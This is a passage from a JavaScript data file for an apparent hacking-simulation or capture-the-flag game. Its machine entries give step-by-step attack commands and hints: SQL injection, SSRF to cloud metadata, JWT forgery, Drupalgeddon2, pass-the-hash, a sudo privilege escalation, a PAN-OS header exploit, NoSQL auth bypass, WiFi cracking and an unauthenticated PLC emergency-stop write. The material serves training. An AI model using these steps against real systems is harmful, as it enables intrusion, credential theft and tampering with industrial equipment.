+  final_key:        'sh4d0w_r00t_k3y'
+};
+
+/* ═══════════════════════════════════════════════
+   MACHINES — 45 total
+   Steps = what player must do before flag fires
+   requires = loot keys needed from previous machines
+═══════════════════════════════════════════════ */
+var M = [
+ /* T1 */ {id:'t1',ip:'192.168.1.10',host:'target1.local',name:'Employee Portal',os:'Ubuntu 22.04',rdp:false,
+    ports:'22/ssh 80/http 3306/mysql',vuln:'UNION SQLi',
+    flag:'FLAG{Un10n_SQLi_M4st3r}',
+    steps:['nmap 192.168.1.10 — find open ports','sqlmap -u "http://192.168.1.10/login.php?id=1" --dbs','sqlmap ... -D target_db --tables','sqlmap ... -T users --dump'],
+    requires:[],
+    hints:['Start with nmap to discover services','Parameter id= is injectable','Use --dbs then --tables then --dump'],
+    unlockMsg:'&#128275; target1 owned! JWT secret + wp-blog.local unlocked.',
+    drops:[{name:'db_dump.txt',icon:'&#128196;',content:'-- target_db.users dump\n\nid | user  | hash                        | role\n 1 | john  | $2b$12$LQv3c1yqBWVH...        | user\n 2 | admin | $2b$12$EixZaYVK1fsb...        | superadmin\n\nCONFIG LEAK:\n  JWT_SECRET = sh4d0w_s3cr3t_k3y_2024\n  APP_KEY = base64:abc123...\n\nNEXT TARGET:\n  Run: nmap 192.168.1.0/24\n  Find: wp-blog.local (192.168.1.13)'}]
+ },
+ /* T1 */ {id:'ftp',ip:'192.168.1.20',host:'ftp.shadowlab',name:'FTP Server',os:'Debian 10',rdp:false,
+    ports:'21/ftp 22/ssh',vuln:'Anonymous FTP login',
+    flag:'FLAG{AnonymOU5_FTP_0wn3d}',
+    steps:['nmap -p21 192.168.1.20','ftp 192.168.1.20  (user: anonymous)','ls /pub/backup/','get config.bak'],
+    requires:[],
+    hints:['nmap first to confirm FTP open','Anonymous login: username=anonymous password=(empty)','Check /pub/backup/ directory'],
+    unlockMsg:'&#128275; FTP owned! config.bak dropped.',
+    drops:[{name:'config.bak',icon:'&#128196;',content:'# ShadowLab backup config\n\n[database]\nhost=192.168.1.21\nuser=webadmin\npass=W3b@dm1n2024!\n\n[mail]\nhost=192.168.1.22 (port 25)\nopen_relay=true\n\n[cms]\nhost=cms.shadowlab (192.168.1.21)\nCVE=Drupalgeddon2 (unpatched)\n\n[ftp]\nbackup_schedule=daily 02:00'}]
+ },
+ /* T1 */ {id:'mail',ip:'192.168.1.22',host:'mail.shadowlab',name:'Mail Server (SMTP)',os:'Ubuntu 18.04',rdp:false,
+    ports:'25/smtp 110/pop3 143/imap 587/submission',vuln:'SMTP open relay',
+    flag:'FLAG{Ma1l_0p3n_R3lay}',
+    steps:['nmap -p25 192.168.1.22 --script smtp-open-relay','curl smtp://192.168.1.22 --mail-from x@x --mail-rcpt admin@shadowlab','Read dropped email dump for credentials'],
+    requires:[],
+    hints:['First confirm open relay with nmap --script smtp-open-relay','curl smtp:// with --mail-from and --mail-rcpt','Inbox dump will contain VPN + RDP creds'],
+    unlockMsg:'&#128275; Mail relay exploited! Internal email dump revealed.',
+    drops:[{name:'email_dump.txt',icon:'&#128196;',content:'=== INBOX DUMP: admin@shadowlab ===\n\nFrom: sysadmin@shadowcorp.com\nSubject: VPN credentials\n  vpn.shadow.corp | user:vpn_user | pass:Sh4d0w_VPN!\n\nFrom: it-helpdesk@shadowcorp.com  \nSubject: Windows workstation setup\n  WIN-WS01 (192.168.1.50)\n  admin / W1nd0ws!\n  RDP enabled on port 3389\n\nFrom: devops@shadowcorp.com\nSubject: Jenkins token\n  http://10.10.0.12:8080\n  admin_token: j3nk1ns_t0k3n_2024'}]
+ },
+ /* T2 */ {id:'t2',ip:'192.168.1.11',host:'target2.local',name:'API Server (JWT)',os:'Debian 11',rdp:false,
+    ports:'80/http 443/https 8080/proxy',vuln:'JWT alg:none confusion',
+    flag:'FLAG{JWT_Alg0r1thm_C0nfus10n}',
+    steps:['curl http://192.168.1.11/api/profile — get JWT token','cat db_dump.txt — find JWT_SECRET','python3 exploits/jwt_forge.py','curl with forged token to /api/admin'],
+    requires:['jwt_secret'],
+    hints:['You need JWT_SECRET from db_dump.txt (target1 loot)','jwt_forge.py changes alg to "none" and role to superadmin','Use forged token in Authorization header'],
+    unlockMsg:'&#128275; JWT forged! API admin access. CMS.shadowlab unlocked.',
+    drops:[{name:'api_admin.txt',icon:'&#128196;',content:'JWT forged successfully.\nAlgorithm HS256 -> none (signature dropped)\n\nAPI /admin response:\n{"status":"ok","role":"superadmin"}\n{"internal_key":"cms_api_k3y_2024"}\n{"next":"cms.shadowlab (192.168.1.21)"}'}]
+ },
+ /* T2 */ {id:'cms',ip:'192.168.1.21',host:'cms.shadowlab',name:'Drupal CMS',os:'Ubuntu 18.04',rdp:false,
+    ports:'80/http 3306/mysql',vuln:'Drupalgeddon2 (CVE-2018-7600)',
+    flag:'FLAG{Druplg3dd0n_RCE}',
+    steps:['nmap 192.168.1.21 — confirm Drupal','curl http://192.168.1.21/?q=user/password — verify version','python3 exploits/drupalgeddon2.py 192.168.1.21','cat /var/www/html/sites/default/settings.php'],
+    requires:['ftp_config_pass'],
+    hints:['Need config from FTP loot (ftp.shadowlab) first','drupalgeddon2.py sends crafted POST to install endpoint','After RCE read settings.php for DB creds'],
+    unlockMsg:'&#128275; Drupal RCE! settings.php leaked. Internal pivot available.',
+    drops:[{name:'settings_php.txt',icon:'&#128196;',content:"Drupal settings.php:\n\n  'database' => 'drupal_db',\n  'username' => 'drupal_admin',\n  'password' => 'Drup@l_S3cr3t!',\n  'host' => '127.0.0.1',\n\nwww-data shell obtained.\nInternal routing: 10.10.0.0/24 reachable\nNext: 10.10.0.5 (internal-app)"}]
+ },
+ /* T2 */ {id:'ws',ip:'192.168.1.50',host:'WIN-WS01',name:'Windows Workstation',os:'Windows 10 Pro',rdp:true,
+    ports:'135/rpc 445/smb 3389/rdp',vuln:'RDP brute-force',
+    flag:'FLAG{W1nd0ws_W0rkst4t10n_0wn3d}',
+    steps:['Read email_dump.txt — find RDP credentials','rdp 192.168.1.50 — connect to workstation','Run mimikatz in RDP session','Extract NTLM hash'],
+    requires:['win_pass'],
+    hints:['Credentials are in email_dump.txt (mail server loot)','Connect with: rdp 192.168.1.50','In RDP terminal type: mimikatz'],
+    unlockMsg:'&#128275; Workstation owned! NTLM hash extracted. SMB lateral possible.',
+    drops:[{name:'ws_hashes.txt',icon:'&#128196;',content:'Mimikatz output:\n  Username: Administrator\n  Domain: WIN-WS01\n  NTLM: 8846f7eaee8fb117ad06bdd830b7586c\n  Password: W1nd0ws!\n\nNetwork shares found:\n  \\\\192.168.1.51\\ADMIN$ (accessible)\n  \\\\192.168.1.51\\Finance$ (accessible)\nNEXT: 192.168.1.51 (FILE-SRV01)'}]
+ },
+ /* T3 */ {id:'wp',ip:'192.168.1.13',host:'wp-blog.local',name:'WordPress Blog',os:'Ubuntu 20.04',rdp:false,
+    ports:'21/ftp 80/http',vuln:'LFI + File Upload RCE',
+    flag:'FLAG{LFI_W0rdPr3ss_Conf1g_L34k}',
+    steps:['nmap 192.168.1.13','curl "http://192.168.1.13/?file=../../../wp-config.php" — LFI test','Confirm DB_PASSWORD in output','Browser: wp-blog.local/upload — upload shell.php.jpg'],
+    requires:[],
+    hints:['WordPress 5.8 has ?file= LFI vulnerability','Try: curl "http://192.168.1.13/?file=../../../wp-config.php"','File upload: rename shell.php to shell.php.jpg to bypass filter'],
+    unlockMsg:'&#128275; WordPress LFI + RCE! vb-forum.local unlocked.',
+    drops:[{name:'wp_config.txt',icon:'&#128196;',content:"WordPress config (LFI):\n\ndefine('DB_NAME', 'wordpress');\ndefine('DB_USER', 'wp_admin');\ndefine('DB_PASSWORD', 'S3cur3_WP_P4ss!');\ndefine('DB_HOST', '127.0.0.1');\n\n[!] Same password reused: vb-forum admin\nNEXT: 192.168.1.14 (vb-forum.local)"}]
+ },
+ /* T3 */ {id:'intapp',ip:'10.10.0.5',host:'internal-app',name:'Internal App (SSRF)',os:'Alpine Linux',rdp:false,
+    ports:'8080/http 9200/elasticsearch',vuln:'SSRF -> AWS metadata',
+    flag:'FLAG{SSRF_1nt3rn4l_0wn3d}',
+    steps:['Pivot via Drupal shell to reach 10.10.0.5','curl "http://10.10.0.5:8080/api/fetch?url=http://169.254.169.254/latest/meta-data/"','curl ".../iam/security-credentials/shadowcorp-role"','Extract AccessKeyId and SecretKey'],
+    requires:['drupal_db_pass'],
+    hints:['Need Drupal RCE first to pivot to 10.10.0.0/24','SSRF endpoint: /api/fetch?url=','AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+    unlockMsg:'&#128275; SSRF! AWS keys extracted. Elasticsearch data dumped.',
+    drops:[{name:'aws_keys.txt',icon:'&#128196;',content:'IMDSv1 SSRF result:\n\nRole: shadowcorp-admin-role\nAccessKeyId: AKIA_SHADOW_KEY\nSecretKey: xK9m_shadow_secret\nToken: expires in 6h\n\nElasticsearch (9200):\n  {"email":"cto@shadowcorp.com","pass":"Sh4d0w_CT0_2024!"}\n  {"email":"devops@shadowcorp.com","pass":"D3v0ps_P4ss!"}\n  47 user records total\nNEXT: aws s3 ls (use extracted keys)'}]
+ },
+ /* T3 */ {id:'filesrv',ip:'192.168.1.51',host:'FILE-SRV01',name:'Windows File Server',os:'Windows Server 2016',rdp:true,
+    ports:'139/netbios 445/smb 3389/rdp',vuln:'SMB Pass-the-Hash',
+    flag:'FLAG{SMB_P4ss_Th3_H4sh}',
+    steps:['cat ws_hashes.txt — get NTLM hash','impacket-psexec -hashes :<NTLM> Administrator@192.168.1.51','dir C:\\Shares\\Finance\\','type passwords.txt'],
+    requires:['win_ntlm'],
+    hints:['NTLM hash is in ws_hashes.txt (workstation loot)','Format: impacket-psexec -hashes :8846f7eaee... Admin@192.168.1.51','After shell: dir C:\\Shares\\Finance\\'],
+    unlockMsg:'&#128275; File server pwned! Finance docs + VPN config extracted.',
+    drops:[{name:'smb_loot.txt',icon:'&#128196;',content:'SMB PtH success:\nimpacket-psexec -hashes :8846f7eaee... Admin@192.168.1.51\nC:\\> nt authority\\system\n\nC:\\Shares\\Finance\\\n  Q4_budget.xlsx\n  employee_salaries.csv\n  VPN_config.ovpn  <-- contains VPN PSK\n\nVPN_config.ovpn:\n  remote vpn.shadow.corp 1194\n  auth-user-pass -> user:vpn_user / pass:Sh4d0w_VPN!\nNEXT: openvpn with this config'}]
+ },
+ /* T4 */ {id:'vb',ip:'192.168.1.14',host:'vb-forum.local',name:'vBulletin Forum',os:'Windows Server 2019',rdp:false,
+    ports:'80/http 1433/ms-sql',vuln:'Blind time-based SQLi',
+    flag:'FLAG{Bl1nd_T1me_B4sed_SQLi}',
+    steps:['cat wp_config.txt — get reused password','curl "http://192.168.1.14/admin" with wp_admin:S3cur3_WP_P4ss!','sqlmap -u "http://192.168.1.14/search.php?q=test" --level=3 --technique=T','Dump vbulletin.user table'],
+    requires:['wp_db_pass'],
+    hints:['Password from wp_config.txt is REUSED on vb-forum admin','Login to /admin first to confirm access','sqlmap needs --technique=T (time-based) and --level=3'],
+    unlockMsg:'&#128275; vBulletin SQLi! MongoDB creds + WiFi handshake found.',
+    drops:[
+      {name:'vb_dump.txt',icon:'&#128196;',content:'vBulletin DB dump:\nadmin : vBull3t1n!2024 (dbo)\n\nweb.config MongoDB:\n  mongodb://admin:M0ng0_P4ss@192.168.1.15:27017\n\nAlso: WiFi handshake captured by IDS\nSee: handshake.cap'},
+      {name:'handshake.cap',icon:'&#128222;',content:'[WPA2 4-way handshake]\nBSSID: AA:BB:CC:DD:EE:01\nSSID: ShadowCorp_5G\nClient: AA:BB:CC:DD:EE:FF\nTimestamp: 2024-11-01 14:09:33\n\nCrack:\n  aircrack-ng -w /root/wordlists/rockyou.txt handshake.cap\n  john --wordlist=rockyou.txt --format=wpapsk handshake.hccapx'}]
+ },
+ /* T4 */ {id:'jenkins',ip:'10.10.0.12',host:'devops-jenkins',name:'Jenkins CI/CD',os:'Ubuntu 20.04',rdp:false,
+    ports:'8080/jenkins 22/ssh',vuln:'Jenkins Script Console RCE (no auth)',
+    flag:'FLAG{J3nk1ns_Scr1pt_RC3}',
+    steps:['cat email_dump.txt — find Jenkins admin token','curl http://10.10.0.12:8080/script — Script Console','POST Groovy: "id".execute().text','cat /var/jenkins_home/credentials.xml'],
+    requires:['drupal_db_pass'],
+    hints:['Jenkins token is in email_dump.txt (mail loot)','Script Console at /script — POST Groovy code','Payload: println("id".execute().text)'],
+    unlockMsg:'&#128275; Jenkins RCE! Deploy keys exposed. prod-server accessible.',
+    drops:[{name:'jenkins_loot.txt',icon:'&#128196;',content:'Jenkins /script RCE:\nprintln("id".execute().text) -> uid=jenkins\n\ncredentials.xml:\n  prod-server SSH key: prod_deploy_rsa\n  host: 10.10.0.20\n  user: deploy\n\nNEXT: ssh deploy@10.10.0.20 (use prod_deploy_rsa key)'}]
+ },
+ /* T4 */ {id:'vpn',ip:'10.10.1.1',host:'vpn.shadow.corp',name:'VPN Gateway (pfSense)',os:'pfSense 2.6',rdp:false,
+    ports:'1194/openvpn 443/https 22/ssh',vuln:'Default credentials (admin:pfsense)',
+    flag:'FLAG{VPN_G4t3w4y_0wn3d}',
+    steps:['cat smb_loot.txt — extract VPN config','openvpn VPN_config.ovpn — connect to VPN','curl https://10.10.1.1/admin — try admin:pfsense','Export route table — find hidden subnets'],
+    requires:['vpn_config'],
+    hints:['VPN config is in smb_loot.txt (file server loot)','Connect first: openvpn then attack','pfSense default creds: admin / pfsense'],
+    unlockMsg:'&#128275; VPN owned! New subnets: 172.16.0.0/24 (OT) + 10.10.2.0/24 (mgmt).',
+    drops:[{name:'vpn_routes.txt',icon:'&#128196;',content:'pfSense admin:pfsense success.\n\nNAT rules exported:\n  172.16.0.0/24 — OT/SCADA network\n  10.10.2.0/24  — Management network\n  10.99.0.0/24  — Security (firewall)\n\nRoutes added to kali.\nNEXT:\n  172.16.0.10 (scada-hmi)\n  10.10.2.5 (core-switch)'}]
+ },
+ /* T5 */ {id:'db',ip:'192.168.1.15',host:'db-server.local',name:'Database Server',os:'RHEL 8',rdp:false,
+    ports:'27017/mongodb 6379/redis',vuln:'MongoDB NoSQL injection ($ne bypass)',
+    flag:'FLAG{N0SQL_1nj3ct10n_W1n}',
+    steps:['cat vb_dump.txt — get MongoDB connection string','curl -H "Content-Type: application/json" -d \'{"username":{"$ne":null},"password":{"$ne":null}}\' http://192.168.1.15/api/login','Extract admin credentials from response','redis-cli -h 192.168.1.15 -a <token>'],
+    requires:['mongo_pass'],
+    hints:['MongoDB creds are in vb_dump.txt','NoSQL inject: {"$ne":null} bypasses auth check','After MongoDB, try Redis: redis-cli -h 192.168.1.15'],
+    unlockMsg:'&#128275; MongoDB bypassed! Redis token extracted. shadow-vault accessible.',
+    drops:[{name:'mongo_dump.txt',icon:'&#128196;',content:'NoSQL auth bypass:\n  POST {"username":{"$ne":null},"password":{"$ne":null}}\n\n{"username":"admin","password":"Adm1n_P@ss_L34k3d","role":"superadmin"}\n{"username":"vault_svc","redis_token":"redis_t0k3n_h3r3"}\n\nRedis: AUTH redis_t0k3n_h3r3\n  GET shadow:vault:config -> port 1337 buffer service\nNEXT: gcc exploits/buffer_overflow.c'}]
+ },
+ /* T5 */ {id:'prod',ip:'10.10.0.20',host:'prod-server',name:'Production Server',os:'Ubuntu 22.04',rdp:false,
+    ports:'22/ssh 80/http 443/https',vuln:'Sudo misconfiguration (baron samedit CVE-2021-3156)',
+    flag:'FLAG{Pr0d_Sudd0_3scal4t10n}',
+    steps:['cat jenkins_loot.txt — get SSH deploy key name','ssh -i prod_deploy_rsa deploy@10.10.0.20','sudo -V — check vulnerable version','sudo -u#-1 /bin/bash — exploit baron samedit'],
+    requires:['ssh_prod_key'],
+    hints:['SSH key name is in jenkins_loot.txt','deploy user has limited sudo','sudo version 1.8.x is vulnerable to baron samedit'],
+    unlockMsg:'&#128275; Production root! config.py exposed. DB creds extracted.',
+    drops:[{name:'prod_loot.txt',icon:'&#128196;',content:'baron samedit exploit:\nsudo -u#-1 /bin/bash -> uid=0(root)\n\n/var/www/app/config.py:\n  SECRET_KEY = pr0d_jwt_s3cr3t\n  DATABASE_URL = postgres://prodadmin:Pr0d_DB_M4st3r!@10.10.0.30\n  REDIS_URL = redis://:redis_t0k3n_h3r3@localhost\n\nNEXT: 10.10.0.30 (mainframe gateway)'}]
+ },
+ /* T5 */ {id:'scada',ip:'172.16.0.10',host:'scada-hmi',name:'SCADA HMI',os:'Windows 7 Embedded',rdp:true,
+    ports:'102/s7 502/modbus 3389/rdp 4840/opc-ua',vuln:'EternalBlue MS17-010 + default SCADA creds',
+    flag:'FLAG{SCAD4_Pwn3d_1CS}',
+    steps:['cat vpn_routes.txt — confirm 172.16.0.10 reachable','nmap 172.16.0.10 --script smb-vuln-ms17-010','python3 exploits/eternalblue.py 172.16.0.10','rdp 172.16.0.10 — use default creds (admin/scada123)','In RDP: plcsim — connect to PLC'],
+    requires:['vpn_config'],
+    hints:['Need VPN first to reach 172.16.0.0/24','Verify MS17-010 with nmap script','After exploit: rdp 172.16.0.10 | default creds: admin/scada123'],
+    unlockMsg:'&#128275; SCADA HMI compromised! PLC 192.168.100.1 accessible.',
+    drops:[{name:'scada_loot.txt',icon:'&#128196;',content:'EternalBlue success.\nSYSTEM@scada-hmi\n\nSiemens S7-300 PLC:\n  IP: 192.168.100.1\n  Protocol: S7comm (port 102)\n  No authentication required!\n\nPLC tags readable:\n  PUMP_RPM=1450, PRESSURE=4.2bar\n  EMERGENCY_STOP=FALSE\nNEXT: s7comm 192.168.100.1'}]
+ },
+ /* T5 */ {id:'switch',ip:'10.10.2.5',host:'core-sw01',name:'Core Switch (Cisco)',os:'Cisco IOS 15.x',rdp:false,
+    ports:'22/ssh 23/telnet 161/snmp 443/https',vuln:'SNMP community string + CVE-2023-20198',
+    flag:'FLAG{C15c0_SW1tch_0wn3d}',
+    steps:['cat vpn_routes.txt — confirm 10.10.2.0/24 reachable','snmpwalk -c public -v2c 10.10.2.5 — enumerate','curl --insecure https://10.10.2.5/webui/logon — CVE-2023-20198','Extract full running-config'],
+    requires:['vpn_config'],
+    hints:['Need VPN to reach 10.10.2.0/24','SNMP community string is "public" (default)','CVE-2023-20198: IOS XE web UI priv escalation'],
+    unlockMsg:'&#128275; Core switch owned! Full network map extracted.',
+    drops:[{name:'switch_config.txt',icon:'&#128196;',content:'Cisco IOS running-config dump:\n\nVLAN 10: 192.168.1.0/24 (users)\nVLAN 20: 10.10.0.0/24 (servers)\nVLAN 30: 10.10.2.0/24 (mgmt)\nVLAN 99: 10.99.0.0/24 (security)\n\nACL rules:\n  permit 10.10.0.0/24 -> 10.99.0.0/24 (firewall reachable)\n  deny any -> 10.99.0.0/24\n\nNEXT: 10.99.0.1 (Palo Alto FW)'}]
+ },
+ /* T6 */ {id:'wifi',ip:'ShadowCorp_5G',host:'ShadowCorp_5G',name:'WiFi WPA2',os:'802.11ac',rdp:false,
+    ports:'BSSID:AA:BB:CC:DD:EE:01  CH:6',vuln:'WPA2 handshake crack',
+    flag:'FLAG{W1F1_H4ndsh4k3_Cr4ck3d}',
+    steps:['cat handshake.cap — confirm handshake file','aircrack-ng -w /root/wordlists/rockyou.txt handshake.cap','Wait for key discovery','Use key to connect to internal WiFi segment'],
+    requires:['vb_admin_pass'],
+    hints:['Handshake file dropped after vb-forum (M10) compromise','aircrack-ng needs --wordlist or -w flag','Key is in rockyou.txt wordlist'],
+    unlockMsg:'&#128275; WiFi cracked! PSK: shadow2024. Internal 10.0.0.0/24 accessible.',
+    drops:[{name:'wifi_key.txt',icon:'&#128196;',content:'WPA2 cracked!\nPSK: shadow2024\n\nInternal WiFi segment: 10.0.0.0/24\n  10.0.0.5 = shadow-vault internal interface\n\nPort 1337: raw TCP service\nNo bounds checking on input!\nRun: gcc exploits/buffer_overflow.c'}]
+ },
+ /* T6 */ {id:'vault',ip:'192.168.1.16',host:'shadow-vault.local',name:'Shadow Vault',os:'Arch Linux',rdp:false,
+    ports:'22/ssh 1337/bof-service',vuln:'Stack buffer overflow (ret2libc)',
+    flag:'FLAG{Buff3r_0v3rfl0w_M4st3r}',
+    steps:['cat mongo_dump.txt — get Redis token','cat wifi_key.txt — confirm vault reachable','cat exploits/buffer_overflow.c — understand the overflow','gcc exploits/buffer_overflow.c && ./a.out'],
+    requires:['redis_token','vault_root'],
+    hints:['Need Redis token from mongo_dump.txt AND wifi_key.txt','buf[64] overflows at 72+ bytes','gcc buffer_overflow.c then ./a.out — it connects to :1337 automatically'],
+    unlockMsg:'&#128275; shadow-vault rooted! Race condition service on :1338.',
+    drops:[{name:'vault_root.txt',icon:'&#127942;',content:'ret2libc chain success!\nEIP overwritten at offset 72\nuid=0(root) gid=0(root)\n\nshadow-vault.local fully compromised.\n\nPort 1338: race condition service\nRun: python3 exploits/race_condition.py\n\nNEXT TARGETS:\n  10.10.0.30 (mainframe)\n  10.10.0.50 (domain controller)'}]
+ },
+ /* T6 */ {id:'plc',ip:'192.168.100.1',host:'plc-s7-300',name:'Siemens PLC S7-300',os:'Siemens Firmware',rdp:false,
+    ports:'102/s7comm',vuln:'S7comm unauthenticated R/W',
+    flag:'FLAG{PLC_S7_Pr0t0c0l_0wn3d}',
+    steps:['cat scada_loot.txt — confirm PLC IP','s7comm 192.168.100.1 — connect without auth','Read DB1 data blocks','Write EMERGENCY_STOP=TRUE — demonstrate control'],
+    requires:['plc_access'],
+    hints:['Requires SCADA HMI compromise first','s7comm command connects to port 102','Read data blocks: DB1.PUMP_RPM, DB1.PRESSURE'],
+    unlockMsg:'&#128275; Siemens PLC compromised! Industrial control system owned.',
+    drops:[{name:'plc_owned.txt',icon:'&#128196;',content:'S7comm exploit:\nConnected 192.168.100.1:102 — no auth!\n\nDB1 contents:\n  PUMP_RPM=1450\n  PRESSURE=4.2 bar\n  EMERGENCY_STOP=FALSE\n\nWrite test:\n  DB1.EMERGENCY_STOP = TRUE -> Accepted!\n\n[!] Critical infrastructure control confirmed.\nNEXT: 10.99.0.1 (perimeter firewall)'}]
+ },
+ /* T6 */ {id:'fw',ip:'10.99.0.1',host:'fw-paloalto',name:'Palo Alto Firewall',os:'PAN-OS 10.1',rdp:false,
+    ports:'22/ssh 443/https 3978/panorama',vuln:'CVE-2024-3400 (command injection via session ID)',
+    flag:'FLAG{P4l0_4lt0_CVE_2024_3400}',
+    steps:['cat switch_config.txt — confirm 10.99.0.0/24 route','nmap 10.99.0.1 — confirm PAN-OS','curl https://10.99.0.1/ssl-vpn/hipreport.esp -H "X-PAN-SESSIONID: ../../../../var/appweb/htdocs/x"','Read firewall rules — full network visible'],
+    requires:['palo_session'],
+    hints:['Need switch_config.txt to confirm routing','CVE-2024-3400: path traversal via X-PAN-SESSIONID header','Confirm PAN-OS version with nmap before exploit'],
+    unlockMsg:'&#128275; Palo Alto 0-day! All traffic visible. Final targets accessible.',
+    drops:[{name:'fw_rules.txt',icon:'&#128196;',content:'CVE-2024-3400 success:\nuid=root@paloalto\n\nFull rule table:\n  ALLOW: any -> 10.10.0.50 (DC)\n  ALLOW: any -> 10.10.0.30 (mainframe)\n  ALLOW: any -> 10.10.0.60 (backup)\n  ALLOW: any -> 10.10.0.80 (HSM)\n\nAll routes now accessible.\nNEXT: 10.10.0.50 (Domain Controller)'}]
+ },
+ /* T7 */ {id:'mainframe',ip:'10.10.0.30',host:'mainframe.shadow',name:'Mainframe Gateway',os:'z/OS UNIX',rdp:false,
+    ports:'23/telnet 992/tls-telnet 8443/https',vuln:'Hardcoded backdoor + telnet',
+    flag:'FLAG{M41nfr4m3_B4ckd00r}',
+    steps:['cat prod_loot.txt — get DATABASE_URL for mainframe hint','telnet 10.10.0.30 — connect to z/OS','Login: IBMUSER / SYS1 (default backdoor)','Submit JCL job to get shell'],
+    requires:['mainframe_pass'],
+    hints:['prod_loot.txt reveals mainframe DB connection','telnet 10.10.0.30 on port 23','Default z/OS backdoor: IBMUSER / SYS1'],
+    unlockMsg:'&#128275; Mainframe breached! AD domain info in memory dump.',
+    drops:[{name:'mainframe_loot.txt',icon:'&#128196;',content:'z/OS telnet:\nIBMUSER:SYS1 -> logged in\n\nJCL RCE:\n  OMVS segment -> uid=0\n\nActive Directory info:\n  Domain: shadow.corp\n  DC: shadow-dc.shadow.corp\n  IP: 10.10.0.50\n  Domain Admin NTLM: 4e9815869d2090cc\n\nNEXT: 10.10.0.50 (Domain Controller)'}]
+ },
+ /* T7 */ {id:'race',ip:'192.168.1.16:1338',host:'shadow-vault:1338',name:'Race Condition Service',os:'Arch Linux',rdp:false,
+    ports:'1338/toctou-service',vuln:'TOCTOU race condition',
+    flag:'FLAG{R4ce_C0nd1t10n_W1nn3r}',
+    steps:['cat vault_root.txt — confirm port 1338','cat exploits/race_condition.py — understand exploit','python3 exploits/race_condition.py','Observe double-transfer success'],
+    requires:['vault_root'],
+    hints:['Need vault_root.txt first (shadow-vault loot)','race_condition.py spawns 50 concurrent threads','TOCTOU: file checked then used — race in between'],
+    unlockMsg:'&#128275; Race condition exploited! Domain controller next.',
+    drops:[{name:'race_proof.txt',icon:'&#128196;',content:'TOCTOU race won:\n50 threads -> 2 concurrent transfers\nBalance: +$99999 x2 = $199998\n\nService crashed -> RCE achieved\nuid=root\n\nNEXT: Domain Controller 10.10.0.50\nTool: python3 exploits/dcsync.py'}]
+ },
+ /* T7 */ {id:'staging',ip:'10.10.0.40',host:'WIN-STAGING',name:'Staging Server',os:'Windows Server 2019',rdp:true,
+    ports:'3389/rdp 445/smb 135/rpc',vuln:'Weak RDP credentials',
+    flag:'FLAG{ST4G1NG_RDP_0wn3d}',
+    steps:['cat jenkins_loot.txt — find staging creds hint','rdp 10.10.0.40 — connect','Login: svc_deploy / Deploy@2024!','Run secretsdump to get DA hash'],
+    requires:['staging_pass'],
+    hints:['Staging creds leaked via Jenkins loot','rdp 10.10.0.40 then login','secretsdump command in RDP terminal'],
+    unlockMsg:'&#128275; Staging owned! Domain Admin NTLM in memory.',
+    drops:[{name:'staging_loot.txt',icon:'&#128196;',content:'RDP: svc_deploy / Deploy@2024!\n\nSecretsDump:\n  Domain: SHADOW\n  DA_shadow NTLM: aad3b435b51404ee\n  Administrator NTLM: 8846f7eaee8fb117\n\nDC reachable: 10.10.0.50\nNEXT: DCSync attack on DC'}]
+ },
+ /* T7 */ {id:'s3',ip:'s3.amazonaws.com',host:'shadowcorp-bucket',name:'AWS S3 Bucket',os:'AWS',rdp:false,
+    ports:'443/https',vuln:'Public bucket + exposed .env',
+    flag:'FLAG{S3_Buckl3t_Expos3d}',
+    steps:['cat aws_keys.txt — get AccessKeyId + SecretKey','aws configure — set up credentials','aws s3 ls s3://shadowcorp-backup','aws s3 cp s3://shadowcorp-backup/.env .'],
+    requires:['aws_key','aws_secret'],
+    hints:['AWS keys are in aws_keys.txt (SSRF loot)','Configure first: aws configure','Then: aws s3 ls s3://shadowcorp-backup'],
+    unlockMsg:'&#128275; S3 bucket exfiltrated! .env file has production secrets.',
+    drops:[{name:'s3_env.txt',icon:'&#128196;',content:'S3 bucket .env:\n\nAWS_ACCESS_KEY=AKIA_SHADOW_KEY\nAWS_SECRET=xK9m_shadow_secret\nDB_PASSWORD=Pr0d_DB_M4st3r!\nSTRIPE_KEY=sk_live_shadow...\nSENDGRID_KEY=SG.shadow...\n\nbackup_2024.tar.gz: 4.2GB\nemployee_data.csv: 38,421 rows\n\nNEXT: aws ec2 describe-instances'}]
+ },
+ /* T8 */ {id:'dc',ip:'10.10.0.50',host:'shadow-dc.shadow.corp',name:'Domain Controller',os:'Windows Server 2022',rdp:true,
+    ports:'53/dns 88/kerberos 389/ldap 445/smb 3389/rdp',vuln:'DCSync (Pass-the-Hash)',
+    flag:'FLAG{DCSync_D0m41n_0wn3d}',
+    steps:['cat mainframe_loot.txt OR staging_loot.txt — get domain admin NTLM','impacket-secretsdump shadow.corp/Administrator@10.10.0.50 -hashes :<NTLM>','Extract krbtgt NTLM for Golden Ticket','rdp 10.10.0.50 — verify domain admin access'],
+    requires:['dc_ntlm'],
+    hints:['NTLM is in mainframe_loot.txt or staging_loot.txt','impacket-secretsdump with -hashes flag','After dump: rdp 10.10.0.50 and run secretsdump in RDP'],
+    unlockMsg:'&#128275; DOMAIN OWNED! krbtgt hash = Golden Ticket. Backup + EC2 unlocked.',
+    drops:[{name:'dc_dump.txt',icon:'&#128196;',content:'DCSync:\nimpacket-secretsdump shadow.corp/Admin@10.10.0.50\n\nAdministrator:500::8846f7eaee8fb117:::\nkrbtgt:502::4e9815869d2090cc:::\nDA_shadow::aad3b435b51404ee:::\n\n[+] Golden Ticket possible (krbtgt)\n[+] Domain fully compromised\n\nNEXT:\n  10.10.0.60 (Veeam backup)\n  54.210.x.x (EC2 instance)'}]
+ },
+ /* T8 */ {id:'backup',ip:'10.10.0.60',host:'backup-srv',name:'Backup Server (Veeam)',os:'Windows Server 2019',rdp:true,
+    ports:'9392/veeam 445/smb 3389/rdp',vuln:'CVE-2023-27532 unauthenticated cred extract',
+    flag:'FLAG{V33m_Cr3d_Dump}',
+    steps:['cat dc_dump.txt — confirm domain compromise','curl http://10.10.0.60:9392/api/credentials — CVE-2023-27532','Parse credential list for backup passwords','rdp 10.10.0.60 — verify access'],
+    requires:['dc_ntlm'],
+    hints:['Veeam API endpoint: :9392/api/credentials','No auth required (CVE-2023-27532)','JSON response contains all backup job credentials'],
+    unlockMsg:'&#128275; Veeam credentials dumped! All backup jobs compromised.',
